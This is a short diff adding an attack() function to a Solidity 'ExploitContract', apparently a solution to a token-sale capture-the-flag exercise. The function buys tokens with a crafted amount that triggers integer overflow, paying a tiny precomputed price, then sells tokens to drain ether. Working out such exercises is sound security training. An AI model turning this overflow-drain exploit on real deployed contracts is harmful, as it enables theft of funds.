@@ -41,6 +41,11 @@ contract ExploitContract {
         tokenSale = _tokenSale;
     }
 
+    function attack() public payable {
+        tokenSale.buy{ value: 1415992086870360064 }(type(uint256).max / 1e18 + 2); // i explain in the test why
+        tokenSale.sell(2); // for 2 ethers because it got one and i have one... do let's do two
+    }
+
     receive() external payable {}
     // write your exploit functions below
 }
